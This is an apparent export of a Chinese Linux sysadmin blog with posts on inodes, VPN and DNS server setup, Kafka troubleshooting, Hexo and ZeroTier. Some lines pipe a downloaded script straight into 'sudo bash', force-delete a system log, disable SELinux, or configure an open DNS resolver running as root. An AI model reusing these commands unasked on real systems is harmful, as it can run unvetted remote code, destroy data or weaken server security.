在一台配置较低的Linux服务器（内存、硬盘比较小）的/data分区内创建文件时，系统提示磁盘空间不足，用df -h命令查看了一下磁盘使用情况，发现/data分区只使用了66%，还有12G的剩余空间，按理说不会出现这种问题。 后来用df -i查看了一下/data分区的索引节点(inode)，发现已经用满(IUsed=100%)，导致系统无法创建新目录和文件。 查找原因：/data/cache目录中存在数量非常多的小字节缓存文件，占用的Block不多，但是占用了大量的inode。 解决方案： 1、删除/data/cache目录中的部分文件，释放出/data分区的一部分inode。 2、用软连接将空闲分区/opt中的newcache目录连接到/data/cache，使用/opt分区的inode来缓解/data分区inode不足的问题： ln -s /opt/newcache /data/cache 查看文件类型格式：file filename 权限r read 可读 数字4 w write 可写 数字2 x execlute可执行 数字1 - 无权限 数字0 软硬链接软链接类似windows下的快捷方式 命令格式： ln -s 源文件 软链接文件 硬链接（命令不加参数，默认创建硬链接） 命令格式： ln -s 源文件 软链接文件 特点：同分区下inode相同，注意是同分区 格式：ln 源文件 硬件链接文件 ls -li filename //查看文件inode信息 注：硬链接可理解为超市前后门，或者超市有多个出入口。硬链接源文件删除后，硬链接后的文件数据依然存在 软连接（又名符号链接） 格式： ln -s 源文件 软链接文件 readlink 软链接文件 查看软链接文件内容 注意：1. 不能对目录创建硬链接，但可以对目录和文件创建软链接 2. 软链接可以跨文件系统进行创建 文件被彻底删除条件 硬链接数量为0（删除所有硬链接） 进程调用数量为0（程序进程被调用-解决方案：重启服务） lsof 命令 lsof 显示所有被打开的文件（可看到正在被哪些程序进程占用） 解决方法一般是重启相应服务，让进程放弃占用即可 删除： \\rm -rf /var/log/messages lsof |grep messages 查看messages文件被哪个程序调用 （文件删除后，查找程序调用，文件名称后面会显示deleted） /etc/init.d/rsyslog restart 重启 seq命令 seq 100000000 &gt;&gt; /var/log/messages 用于生产从某个数到另外一个数之间的所有整数。 du命令-计算文件所占空间-s summary 简介 -h 人类可读的方式显示大小 du -sh /* |grep G 只显示以G为大小的文件 du -sh /* |grep M 只显示以M为大小的文件 用户和组root 用户UID和GID都为0 普通用户 UID从500开始 /etc/passwd 存放用户信息 /etc/shadow 存放用户密码 查看所有shell cat /etc/shells awk awk -F: &#39;&#123;print $1,$3,$NF&#125;&#39; /etc/passwd 以冒号为菜刀，取首列/第三列和最后一列 awk -F : &#39;&#123;print $1,$NF&#125;&#39; /etc/passwd 以冒号为菜刀，取首列和最后一列 awk -F: &#39;&#123;print $NF&#125;&#39; /etc/passwd 以冒号为菜刀，取最后一列 Linux三种时间（了解） mtime 文件内容修改时间 ctime 属性改变时间 atime 访问时间 stat filename 使用stat命令查看详细时间","categories":[],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://garywu520.github.io/tags/Linux%E5%9F%BA%E7%A1%80/"},{"name":"xargs","slug":"xargs","permalink":"https://garywu520.github.io/tags/xargs/"}]},{"title":"获取最新-中国地区IP段","slug":"获取最新-中国地区IP段","date":"2017-05-27T08:32:00.000Z","updated":"2017-05-27T08:35:43.852Z","comments":true,"path":"2017/05/27/获取最新-中国地区IP段/","link":"","permalink":"https://garywu520.github.io/2017/05/27/%E8%8E%B7%E5%8F%96%E6%9C%80%E6%96%B0-%E4%B8%AD%E5%9B%BD%E5%9C%B0%E5%8C%BAIP%E6%AE%B5/","excerpt":"APNIC是管理亚太地区IP地址分配的机构，它有着丰富准确的IP地址分配库，同时这些信息也是对外公开的 #!/bin/sh #下载亚太地区IP地址表 wget -c http://ftp.apnic.net/stats/apnic/delegated-apnic-latest 筛选并输出为中国IP地址段","text":"APNIC是管理亚太地区IP地址分配的机构，它有着丰富准确的IP地址分配库，同时这些信息也是对外公开的 #!/bin/sh #下载亚太地区IP地址表 wget -c http://ftp.apnic.net/stats/apnic/delegated-apnic-latest 筛选并输出为中国IP地址段 cat delegated-apnic-latest | awk -F &#39;|&#39; &#39;/CN/&amp;&amp;/ipv4/ &#123;print $4 &quot;/&quot; 32-log($5)/log(2)&#125;&#39;|cat &gt;ip.txt 保存为可执行脚本，运行后可以看到一个ip.txt","categories":[],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://garywu520.github.io/tags/Linux%E5%9F%BA%E7%A1%80/"},{"name":"IP","slug":"IP","permalink":"https://garywu520.github.io/tags/IP/"},{"name":"APNIC","slug":"APNIC","permalink":"https://garywu520.github.io/tags/APNIC/"}]},{"title":"SoftEther VPN","slug":"SoftEther-VPN","date":"2017-05-27T08:19:25.000Z","updated":"2017-05-27T08:28:11.218Z","comments":true,"path":"2017/05/27/SoftEther-VPN/","link":"","permalink":"https://garywu520.github.io/2017/05/27/SoftEther-VPN/","excerpt":"安装依赖包： yum update yum groupinstall &quot;Development Tools&quot; yum install zlib-devel openssl-devel readline-devel ncurses-devel wget tar dnsmasq net-tools","text":"安装依赖包： yum update yum groupinstall &quot;Development Tools&quot; yum install zlib-devel openssl-devel readline-devel ncurses-devel wget tar dnsmasq net-tools 关闭Selinux sed -i &#39;s/SELINUX=enforcing/SELINUX=disabled/g&#39; /etc/selinux/config 重启系统 下载安装SoftEther http://www.softether-download.com/cn.aspx 解压 cd /opt wget http://www.softether-download.com/files/softether/v4.20-9608-rtm-2016.04.17-tree/Linux/SoftEther_VPN_Server/64bit_-_Intel_x64_or_AMD64/softether-vpnserver-v4.20-9608-rtm-2016.04.17-linux-x64-64bit.tar.gz tar -zxvf softether-vpnserver-v4.20-9608-rtm-2016.04.17-linux-x64-64bit.tar.gz cd vpnserver make 回答3个问题，全部选择1，同意协议。 配置SoftEther (1)启动vpnserver /opt/vpnserver/vpnserver start (2) 运行vpncmd /opt/vpnserver/vpncmd 选择1，按2次回车 (3)设置VPN管理员密码 VPN Server&gt;ServerPasswordSet # 输入密码 创建Virtual Hub（Hub名字为MOB）： VPN Server&gt;HubCreate MOB # 设置密码 (4)创建Local bridge, 它比SecureNAT要高效，但是配置要复杂一点。local bridge还需要DHCP服务，我会在后面安装。 VPN Server&gt;BridgeCreate /DEVICE:&quot;soft&quot; /TAP:yes MOB 切换到MOB： VPN Server&gt;Hub MOB 创建用户： VPN Server/MOB&gt;UserCreate test # 全部回车即可 为用户设置密码： VPN Server/MOB&gt;UserPasswordSet test 设置L2TP/IPSec： VPN Server/MOB&gt;IPsecEnable IPsecEnable command - Enable or Disable IPsec VPN Server Function Enable L2TP over IPsec Server Function (yes / no): yes Enable Raw L2TP Server Function (yes / no): yes Enable EtherIP / L2TPv3 over IPsec Server Function (yes / no): yes Pre Shared Key for IPsec (Recommended: 9 letters at maximum): your_shared_key Default Virtual HUB in a case of omitting the HUB on the Username: MOB The command completed successfully. 上面设置了IPsec协议。如果要设置OpenVPN，执行： VPN Server/MOB&gt;ServerCertRegenerate &lt;your_server_IP OR domain&gt; VPN Server/MOB&gt;ServerCertGet ~/cert.cer VPN Server/MOB&gt;SstpEnable yes VPN Server/MOB&gt;OpenVpnEnable yes /PORTS:1194 为OpenVPN客户端生成配置文件： VPN Server/MOB&gt;OpenVpnMakeConfig ~/openvpn_config.zip 回到管理员提示符： VPN Server/MOB&gt;Hub Hub command - Select Virtual Hub to Manage The Virtual Hub selection has been unselected. The command completed successfully. VPN Server&gt; 开启VPN over ICMP和DNS： VPN Server&gt;VpnOverIcmpDnsEnable /ICMP:yes /DNS:yes 最后，Ctrl+c退出vpn命令提示符。 6 设置DHCP、IP重定向 Softether已经配置完成，前面提到过，local bridge需要DHCP服务。dnsmasq在第一步已经安装，我们只需要配置一下： cat &gt;&gt; /etc/dnsmasq.conf &lt;&lt;EOF interface=tap_soft dhcp-range=tap_soft,192.168.7.50,192.168.7.90,12h dhcp-option=tap_soft,3,192.168.7.1 port=0 dhcp-option=option:dns-server,8.8.8.8 EOF 开启ip_forward： echo net.ipv4.ip_forward = 1 &gt;&gt; /etc/sysctl.d/ipv4_forwarding.conf sysctl -n -e --system 查看设置是否成功： cat /proc/sys/net/ipv4/ip_forward 应该输出为1；如果为0，执行： echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward 配置防火墙： /sbin/iptables -I INPUT -p tcp --dport 1194 -j ACCEPT iptables -t nat -A POSTROUTING -s 192.168.7.0/24 -j SNAT --to-source [YOUR_ERVER_IP] iptables-save &gt;&gt; /etc/sysconfig/iptables 启动DHCP和防火墙： chkconfig --add dnsmasq chkconfig --add iptables chkconfig dnsmasq on chkconfig iptables on 7.把SoftEther配置为服务 vim /etc/init.d/vpnserver #!/bin/sh ### BEGIN INIT INFO # Provides: vpnserver # Required-Start: $remote_fs $syslog # Required-Stop: $remote_fs $syslog # Default-Start: 2 3 4 5 # Default-Stop: 0 1 6 # Short-Description: Start daemon at boot time # Description: Enable Softether by daemon. ### END INIT INFO DAEMON=/opt/vpnserver/vpnserver LOCK=/var/lock/subsys/vpnserver TAP_ADDR=192.168.7.1 test -x $DAEMON || exit 0 case &quot;$1&quot; in start) $DAEMON start touch $LOCK sleep 1 /sbin/ifconfig tap_soft $TAP_ADDR ;; stop) $DAEMON stop rm $LOCK ;; restart) $DAEMON stop sleep 3 $DAEMON start sleep 1 /sbin/ifconfig tap_soft $TAP_ADDR ;; *) echo &quot;Usage: $0 &#123;start|stop|restart&#125;&quot; exit 1 esac exit 0 启动VPNServer chmod 755 /etc/init.d/vpnserver chkconfig --add vpnserver chkconfig vpnserver on","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"L2TP/PPTP/OVPN","slug":"L2TP-PPTP-OVPN","permalink":"https://garywu520.github.io/tags/L2TP-PPTP-OVPN/"}]},{"title":"高性能递归DNS服务器-部署","slug":"高性能递归DNS服务器","date":"2017-05-27T07:20:59.000Z","updated":"2018-06-21T02:42:05.739Z","comments":true,"path":"2017/05/27/高性能递归DNS服务器/","link":"","permalink":"https://garywu520.github.io/2017/05/27/%E9%AB%98%E6%80%A7%E8%83%BD%E9%80%92%E5%BD%92DNS%E6%9C%8D%E5%8A%A1%E5%99%A8/","excerpt":"前言部署，共计分两步走。 环境：CentOS7 第一：DNScrypt部署（目的：DNS防污染） 第二：部署高性能递归DNS服务器-unbound","text":"前言部署，共计分两步走。 环境：CentOS7 第一：DNScrypt部署（目的：DNS防污染） 第二：部署高性能递归DNS服务器-unbound 1.1 DNScrypt-wrapper部署DNScrypt-wrapper与Dnscypt-proxy客户端通过密钥交互，实现无污染；当然，Wrapper也可以不部署，直接使用现成的公共服务器，下载客户端“Simple DnsCrypt”来获取【需要翻墙】 下载： https://download.libsodium.org/libsodium/releases/old/libsodium-1.0.3.tar.gz 编译安装 dnscrypt-wrapper 依赖 libsodium 和 libevent2；前者一般源里没有，后者一般默认版本不是2而是比较旧的1，我们得先来手动编译这两个库。 安装依赖 wget https://download.libsodium.org/libsodium/releases/old/libsodium-1.0.3.tar.gz tar -xzvf libsodium-1.0.3.tar.gz cd libsodium-1.0.3 yum -y groupinstall &quot;Development Tools&quot; //安装编译环境 CFLAGS=&quot;-O3 -fPIC&quot; ./configure //编译 make &amp;&amp; make install ldconfig //命令作用：是为了让动态链接库为系统所共享 然后我们从这里下载 libevent2 ，这里我们选择 2.0.22 稳定版： wget https://github.com/libevent/libevent/releases/download/release-2.0.22-stable/libevent-2.0.22-stable.tar.gz tar -zxvf libevent-2.0.22-stable.tar.gz cd libevent-2.0.22-stable ./configure --prefix=/usr make &amp;&amp; make install echo /usr/local/lib &gt; /etc/ld.so.conf.d/usr_local_lib.conf ldconfig 编译安装dnscrypt-wrapper 搞定两个依赖库之后，就可以开始编译 dnscrypt-wrapper 啦 yum install -y git git clone --recursive git://github.com/Cofyc/dnscrypt-wrapper.git cd dnscrypt-wrapper make configure ./configure 如果你在 make configure 这一步出错，你可能需要先安装 autoconfig yum install -y autoconfig 如果没什么问题，那么就可以开始编译安装了： make &amp;&amp; make install 安装完成会出现如下提示： # make install install -d -m 755 ‘/usr/local/bin’ install -p dnscrypt-wrapper ‘/usr/local/bin’ 至此编译完成。 ln -s /usr/local/sbin/dnscrypt-wrapper /usr/sbin/dnscrypt-wrapper 1.2 dnscrypt-proxy客户端-部署同样需要安装最开始两个依赖包 下载：https://download.dnscrypt.org/dnscrypt-proxy/dnscrypt-proxy-1.9.1.tar.bz2 tar -xf dnscrypt-proxy-1.9.1.tar.bz2 cd dnscrypt-proxy-1.9.1 cd src/libevent-modified/ CFLAGS=&quot;-O3 -fPIC&quot; ./configure make &amp;&amp; make install cd ../.. echo /usr/local/lib &gt; /etc/ld.so.conf.d/usr_local_lib.conf ldconfig ./configure make -j2 &amp;&amp; make install dnscrypt-proxy启动执行文件 路径默认在/usr/local/sbin/dnscrypt-proxy /usr/local/share/dnscrypt-proxy/dnscrypt-resolvers.csv中存放了已经支持dnscrypt查询的公共dns ​ 开机启动服务 # cd /etc/init.d/ # vim dnscypt-proxy #! /bin/sh ### BEGIN INIT INFO # Provides: dnscrypt-proxy # Required-Start: $local_fs $network # Required-Stop: $local_fs # Default-Start: 2 3 4 5 # Default-Stop: 0 1 6 # Short-Description: dnscrypt-proxy # Description: dnscrypt-proxy secure DNS client ### END INIT INFO # Authors: https://github.com/simonclausen/dnscrypt-autoinstall/graphs/contributors # Project site: https://github.com/simonclausen/dnscrypt-autoinstall PATH=/usr/sbin:/usr/bin:/sbin:/bin DAEMON=/usr/local/sbin/dnscrypt-proxy NAME=cisco ADDRESS=208.67.220.220 PNAME=2.dnscrypt-cert.opendns.com PKEY=B735:1140:206F:225D:3E2B:D822:D7FD:691E:A1C3:3CC8:D666:8D0C:BE04:BFAB:CA43:FB79 case &quot;$1&quot; in start) echo &quot;Starting $NAME&quot; $DAEMON --daemonize --ignore-timestamps --ephemeral-keys --edns-payload-size=50000 --max-active-requests=100000 --user=root --local-address=127.0.0.1:5353 --resolver-address=$ADDRESS --provider-name=$PNAME --provider-key=$PKEY --logfile=/var/log/dnscrypt.log --pidfile=/var/run/dnscrypt.pid ;; stop) echo &quot;Stopping $NAME&quot; pkill -f $DAEMON ;; restart) $0 stop $0 start ;; *) echo &quot;Usage: /etc/init.d/dnscrypt-proxy &#123;start|stop|restart&#125;&quot; exit 1 ;; esac exit 0 # chmod 755 dnscrypt # chkconfig --add dnscrypt # chkconfig dnscrypt on 使用命令测试： root@MyServer:~# dig @127.0.0.1 -p 5353 twitter.com 发现获取到的 IP 均相同且为真正的正确 IP 地址，服务生效。 2.1 CentOS7 部署unbound事先安装dnscrypt 下载：https://www.unbound.net/downloads/unbound-1.6.0.tar.gz 1. 安装编译环境插件 # yum update # yum groupinstall -y &quot;Development tools&quot; openssl-devel expat-devel 编译安装libevent2 # wget https://github.com/libevent/libevent/releases/download/release-2.0.22-stable/libevent-2.0.22-stable.tar.gz # tar -zxvf libevent-2.0.22-stable.tar.gz # cd libevent-2.0.22-stable # ./configure --prefix=/usr # make &amp;&amp; make install # echo /usr/local/lib &gt; /etc/ld.so.conf.d/usr_local_lib.conf # ldconfig 2.下载、解压后进入unbound目录 # wget https://www.unbound.net/downloads/unbound-1.6.0.tar.gz # tar -zxvf unbound-1.6.0.tar.gz # cd unbound-1.6.0 # ./configure -with-libevent &amp;&amp; make &amp;&amp; make install 注：libevent可以提高unbound性能，配置文件参数会用到，否则参数无效 3.添加用户和组 # groupadd unbound # useradd -m -g unbound -s /bin/false unbound 4.关闭firewall开启iptables # systemctl stop firewalld.service #停止firewall # systemctl disable firewalld.service #禁止firewall开机启动 # firewall-cmd --state #查看默认防火墙状态 # yum install -y iptables-services #安装iptables 5.编辑配置文件 # vi /usr/local/etc/unbound/unbound.conf 详见“官方优化文档”说明 # unbound-control reload #重新加载配置文件，同时会清理DNS缓存 6. dnsmasq-china-list 来加速国内域名 # yum install -y git # git https://github.com/felixonmars/dnsmasq-china-list.git # cd dnsmasq-china-list # make unbound # cp ./accelerated-domains.china.unbound.conf /usr/local/etc/unbound/ 参考： https://blog.phoenixlzx.com/2016/04/27/better-dns-with-unbound/ 7.启动【开机启动】 # unbound-checkconf #检测配置文件是否有语法错误 # unbound # 启动 # whereis unbound # 查找启动文件路径 # cd /etc/init.d/ # vim unbound #!/bin/bash # chkconfig: 2345 67 33 # description: unbound service start. /usr/local/sbin/unbound # chmod 755 unbound # chkconfig --add unbound # chkconfig unbound on # chkconfig --list 8.注：本机127.0.0.1不提供unbound解析，网卡设置里面正常填写外部国内DNS 9.Dig解析测试 2.2 unbound主配置文件说明官方文档： https://www.unbound.net/documentation/unbound.conf.html num-threads: 8 //线程数可以修改为物理核心数 interface: 10.0.0.37 //侦听所有 IPv4 地址（只监听本机IP地址） //如果只需要本机使用，则一个 interface: 127.0.0.1 即可 verbosity: 4 //日志输出等级，默认1 val-log-level:2 //日志级别 logfile: &quot;unbound_running.log&quot; //学会看日志去解决问题，默认路径/usr/local/etc/unbound目录 so-rcvbuf: 8m #官方建议（4m或8m） so-sndbuf: 8m #官方建议（4m或8m） so-reuseport: yes # 提高UDP性能多线程，就写 yes， msg-cache-size: 50m # msg缓存大小 rrset-cache-size: 100m #msg缓存大小，值设置msv-cache-size的2倍。 由于malloc开销，总内存使用量可能会上升到输入配置的总缓存内存的两倍（或2.5倍）。 msg-cache-slabs: #官方建议配置为“num-threads”的2次幂 rrset-cache-slabs: #官方建议配置为“num-threads”的2次幂 infra-cache-slabs: #官方建议配置为“num-threads”的2次幂 key-cache-slabs: #官方建议配置为“num-threads”的2次幂 cache-max-ttl: 3600 # 最大TTL值，专治各种运营商 DNS 缓存不服 此选项非常重要，可以解决部分网站加载慢的问题 outgoing-num-tcp: 1024 # 限制每个线程向上级查询的 TCP 并发数 incoming-num-tcp: 1024 # 限制每个线程接受查询的 TCP 并发数 edns-buffer-size: 1480 #默认4096，改为1480 可以解决碎片重组问题 # 下面这四个不需要解释了吧，不想用那个就写 no do-ip4: yes # do-ip6: yes #这个IPV6参数务必要注释掉！！！ do-udp: yes do-tcp: yes tcp-upstream: yes # 强制使用 tcp 协议连上游的话写 yes(防止污染) access-control: 0.0.0.0/0 allow # 本允许哪个网段可以使用本DNS 注意！ 如果监听所有 IPv4 和 IPv6 地址的话，就必须限制允许访问的 IP 地址范围。假设一台主要针对内网，同时为 202.96.0/24 服务的服务器，应配置如下 ACL： access-control: 0.0.0.0/0 deny # 禁止除下列地址之外的所有IPv4地址 access-control: 202.96.0/24 allow access-control: 10.0.0.0/8 allow # RFC 1918 access-control: 172.16.0.0/12 allow # RFC 1918 access-control: 192.168.0.0/16 allow # RFC 1918 access-control: 127.0.0.0/8 allow # 允许本机查询 access-control: ::0/0 deny # 禁止除下列地址之外的所有IPv6地址 access-control: (自己的IPv6网段) allow access-control: ::1 allow # 允许本机查询 access-control: ::ffff:127.0.0.1 allow # 允许本机查询 当然，对于对内网服务的机器来说，应单独指定内网的 IP 地址而不是监听全部可用 IP 地址，以避免暴露攻击面。 include: &quot;/usr/local/etc/unbound/hosts.conf&quot; #如果需要做内网域名劫持，需要在这个位置配置 root-hints: &quot;/usr/local/etc/unbound/named.cache&quot; #顶c级根域 - 没有的话在 ftp://FTP.INTERNIC.NET/domain/named.cache 下载一份 module-config: &quot;validator iterator&quot; #启用DNSSEC，这两个模块缺一不可 auto-trust-anchor-file: &quot;/usr/local/etc/unbound/root.key&quot; # 开启DNSSEC 自动信任锚文件 提前使用“unbound-anchor -a root.key”命令生成root.key domain-insecure: &quot;sina.com.cn&quot; #这个参数非常重要，意思是定义的域名不经过DNSSEC检查，加快国内域名访问速度。有几个写几个，最好使用include维护单独一个文件。 hide-identity: yes # 不返回对 id.server 和 hostname.bind 的查询。 hide-version: yes # 不返回对 version.server 和 version.bind 的查询。 接下来配置remote-control【远程控制】 主要作用是可以很方便的使用 unbound-control命令 提前在/usr/local/etc/unbound目录下生成必要的TLS密钥文件 # unbound-control-setup 配置文件开启 remote-control: control-enable: yes server-key-file: &quot;/usr/local/etc/unbound/unbound_server.key&quot; server-cert-file: &quot;/usr/local/etc/unbound/unbound_server.pem&quot; control-key-file: &quot;/usr/local/etc/unbound/unbound_control.key&quot; control-cert-file: &quot;/usr/local/etc/unbound/unbound_control.pem&quot; # unbound-control reload | start | stop #重新加载配置文件，而无需重启DNS服务 # unbound-control -h #显示帮助信息 # 不过下面有 identity 和 version 的自定义选项，不隐藏这些的话，修改下选项还可以卖个萌 harden-glue: yes # 建议打开 unwanted-reply-threshold: 10000 # 官方为建议1000万 do-not-query-localhost: no # 一般是为了防止扯皮丢包开着，不过等下要用 DNSCrypt 所以关掉 prefetch: yes # 蛮好用的，开着吧 minimal-responses: yes # 省带宽，开着吧。本机用可以关掉 username: &quot;root&quot; #要求用户运行 # 关键部分来了，把默认查询全部丢给 DNSCrypt。使用 [地址]@[端口] 指定查询地址和端口，默认端口 53。 # 然后把国内的地址丢给国内的缓存服务器。这两个选项的顺序不能错哟。 # 如果使用隧道查询，把这个地址改为隧道对端的地址，或者一个国外的 DNS 服务器都可以，例如 8.8.8.8。 #指定域名让特定DNS解析 forward-zone: name: &quot;jd.com.&quot; forward-addr: 114.114.114.114 forward-zone: name: &quot;.&quot; forward-addr: 127.0.0.1@5353 forward-addr: 192.168.10.10@5351","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"DNS","slug":"DNS","permalink":"https://garywu520.github.io/tags/DNS/"},{"name":"unbound","slug":"unbound","permalink":"https://garywu520.github.io/tags/unbound/"},{"name":"递归DNS服务器","slug":"递归DNS服务器","permalink":"https://garywu520.github.io/tags/%E9%80%92%E5%BD%92DNS%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"DNScrypts","slug":"DNScrypts","permalink":"https://garywu520.github.io/tags/DNScrypts/"}]},{"title":"zookeeper和kafka那点儿事儿","slug":"flume与kafka那点儿事儿","date":"2017-05-27T06:23:05.000Z","updated":"2017-07-04T11:03:49.542Z","comments":true,"path":"2017/05/27/flume与kafka那点儿事儿/","link":"","permalink":"https://garywu520.github.io/2017/05/27/flume%E4%B8%8Ekafka%E9%82%A3%E7%82%B9%E5%84%BF%E4%BA%8B%E5%84%BF/","excerpt":"描述今天flume报错：supervisor强制重启了所有flume进程，频繁提示此故障 解决思路：1. 查看kafka消费情况 /opt/kafka/bin/kafka-consumer-offset-checker.sh --zookeeper zookeeper:2181 --topic alc_raw --group alc 任意一台kafka只要能连接到zookeeper就可以看到，有个错误：Could not parse broker info due to null","text":"描述今天flume报错：supervisor强制重启了所有flume进程，频繁提示此故障 解决思路：1. 查看kafka消费情况 /opt/kafka/bin/kafka-consumer-offset-checker.sh --zookeeper zookeeper:2181 --topic alc_raw --group alc 任意一台kafka只要能连接到zookeeper就可以看到，有个错误：Could not parse broker info due to null 2.查看Grafana kafka生产情况监控，的确，与告警时间能对上，告警后，kafka没有了速度，值变成了0 3.查看“数据收集流程”拓扑图，查看其flume与kafka关系。可以看出，kafka所有生产消息均有zookeeper集群控制 4.显示所有zookeeper brokers的topic节点（任意一台kafka只要能连接到zookeeper就可以看到） /opt/kafka/bin/kafka-topics.sh --zookeeper zookeeper:2181 --describe --topic alc_raw 此命令结果中，如果有异常，“Leader”列将会出现横杠“-”，而不是IP。这时，我们看后面的&quot;Isr&quot;列，找到对应的kafka节点服务器IP，重启对应的kafka服务即可解决问题。 原因及解决方法原因可能是我们第三个kafka节点服务器（36个分区）个别分区坏道导致，处理方法：重启了该kafka节点的kafka服务 命令： supervisorctl status kafka 后现象kafka生产正常，flume拉取正常，flume无报错","categories":[],"tags":[{"name":"kafka","slug":"kafka","permalink":"https://garywu520.github.io/tags/kafka/"},{"name":"zookeeper","slug":"zookeeper","permalink":"https://garywu520.github.io/tags/zookeeper/"},{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"大数据","slug":"大数据","permalink":"https://garywu520.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"flume","slug":"flume","permalink":"https://garywu520.github.io/tags/flume/"}]},{"title":"生活","slug":"生活","date":"2017-05-26T09:58:22.000Z","updated":"2017-05-26T10:51:46.439Z","comments":true,"path":"2017/05/26/生活/","link":"","permalink":"https://garywu520.github.io/2017/05/26/%E7%94%9F%E6%B4%BB/","excerpt":"&lt;&lt;生活&gt;&gt; 不是这样 就是那样","text":"&lt;&lt;生活&gt;&gt; 不是这样 就是那样 总之，不会是 你想要的那样","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://garywu520.github.io/tags/%E9%9A%8F%E7%AC%94/"},{"name":"生活","slug":"生活","permalink":"https://garywu520.github.io/tags/%E7%94%9F%E6%B4%BB/"}]},{"title":"Hexo搭建GitHub Blog","slug":"Hexo搭建GitHub Blog","date":"2017-05-24T12:20:16.000Z","updated":"2017-05-27T09:28:37.418Z","comments":true,"path":"2017/05/24/Hexo搭建GitHub Blog/","link":"","permalink":"https://garywu520.github.io/2017/05/24/Hexo%E6%90%AD%E5%BB%BAGitHub%20Blog/","excerpt":"环境准备1.安装Git （略）2.安装node.js 下载地址：https://nodejs.org/zh-cn/download/ 根据平台，下载对应版本默认安装","text":"环境准备1.安装Git （略）2.安装node.js 下载地址：https://nodejs.org/zh-cn/download/ 根据平台，下载对应版本默认安装 3. 配置GitHub SSH Keys首先启动一个Git Bash窗口（非Windows用户直接打开终端） 执行： cd ~/.ssh ssh-keygen -t rsa -C &quot;your_email@youremail.com&quot; 直接回车，不要修改默认路径；然后根据提示输入两次密码，密码要一致 证书默认保存在C:\\Users\\当前登录用户名\\.ssh目录下 GitHub提交公钥： 找到.ssh文件夹，用文本编辑器打开“id_rsa.pub”文件，复制内容到剪贴板。 打开 https://github.com/settings/ssh ，点击 Add SSH Key 按钮，粘贴进去保存即可。 测试登陆SSH 运行git bash ssh -T git@github.com 5. 安装HexoNode和Git都安装好后,首先创建一个文件夹,如Hexo。用户存放hexo的配置文件,然后进入Hexo文件夹安装Hexo。 执行如下命令安装Hexo： sudo npm install -g hexo 初始化然后，执行init命令初始化hexo,命令： hexo init 好啦，至此，全部安装工作已经完成！blog就是你的博客根目录，所有的操作都在里面进行。 6.Hexo关联GitHub建立Repository仓库，仓库格式:[username.github.io]固定写法 现在我们需要_config.yml文件，来建立关联，命令： vim _config.yml 翻到最下面，改成我这样子的 deploy: type: git repo: [SSH地址] branch: master 注：上面的格式有个坑，即type:和git之间有个英文的空格，该文件就是这种格式，否则文章上传报错 然后执行命令： npm install hexo-deployer-git --save 文章新建、编辑、保存，静态化，本地预览，上传hexo new&quot;postName&quot; #新建文章 hexo generate（hexo g也可以） //生成静态页面 hexo server //本地启动预览 预览地址： http://localhost:4000 所有的文章修改都可以使用以上两个命令进行预览，确认无问题后，使用下面的命令上传到github blog中 执行配置命令： hexo deploy 然后再浏览器中输入https://wuyanteng.github.io/就行了，我的github的账户叫wuyanteng,把这个改成你github的账户名就行了 常用命令hexo new&quot;postName&quot; #新建文章 hexo new page&quot;pageName&quot; #新建页面 hexo generate #生成静态页面至public目录 hexo help # 查看帮助 hexo version #查看Hexo的版本 报错总结本地代码上传不成功，执行hexo -d无反应 清空D:/Hexo 右键D:/Hexo，打开git bash npm install hexo --save npm init hexo g 生成静态页面 hexo s 本地启动，并在浏览器预览 vim _config.yml 翻到最下面，改成我这样子的 deploy: type: git repo: [ssh地址] branch: master 注：上面的格式有个坑，即type:和git之间有个英文的空格，下面两个也是 然后执行命令： npm install hexo-deployer-git --save hexo deploy 再次上传到github 主题推荐 主题：[Hexo主题](https://hexo.io/themes/)","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"GitHub","slug":"GitHub","permalink":"https://garywu520.github.io/tags/GitHub/"}]},{"title":"全球局域网穿透利器-ZeroTier","slug":"全球局域网穿透利器-ZeroTier","date":"2017-05-23T07:06:58.000Z","updated":"2018-05-23T07:59:12.749Z","comments":true,"path":"2017/05/23/全球局域网穿透利器-ZeroTier/","link":"","permalink":"https://garywu520.github.io/2017/05/23/%E5%85%A8%E7%90%83%E5%B1%80%E5%9F%9F%E7%BD%91%E7%A9%BF%E9%80%8F%E5%88%A9%E5%99%A8-ZeroTier/","excerpt":"123使用ZeroTier可以将世界各地需要接入的设备放在一个虚拟的局域网中，这样即使在外网，也可以直接访问。官网：https:&#x2F;&#x2F;www.zerotier.com","text":"123使用ZeroTier可以将世界各地需要接入的设备放在一个虚拟的局域网中，这样即使在外网，也可以直接访问。官网：https:&#x2F;&#x2F;www.zerotier.com 注册账号123建议使用Google账户快速登录注：免费版本支持接入100台设备 配置ZeroTier(1)创建Network 1登录https:&#x2F;&#x2F;my.zerotier.com --- 点击NetWorks -- Create -- 手动输入一个名称 (2)配置网络 1234NetWorks -- Settings中: Network ID: 各个设备接入的ID(务必牢记) Managed Routes: 可以任意选择一个私有网络子网 其他：自己研究 #####Linux服务器安装ZeroTier 123我的最终目的是想通过这种方式管理我的远程服务器，所以需要在服务器上安装ZeroTier所有客户端下载：https:&#x2F;&#x2F;www.zerotier.com&#x2F;download.shtml 极速安装方法: 1234567891011# curl -s https:&#x2F;&#x2F;install.zerotier.com&#x2F; | sudo bash......完毕！*** Enabling and starting zerotier-one service...正在启动 zerotier-one：[确定]*** Waiting for identity generation...*** Success! You are ZeroTier address [ 061f86244d ].注：以上命令适用于x86和x64各种架构, 安装完毕后，服务自动加入开机自启动。 加入网络 1# zerotier-cli join [network id] IOS和windows安装并加入网络123方法更简单, 都需要network id, 不再赘述。安装完成后，点击join network（windows客户端不要点击create network！！！）注：appstore下载ZeroTier需要梯子 Web控制台管理所有设备1上面客户端都已经加入了相同network 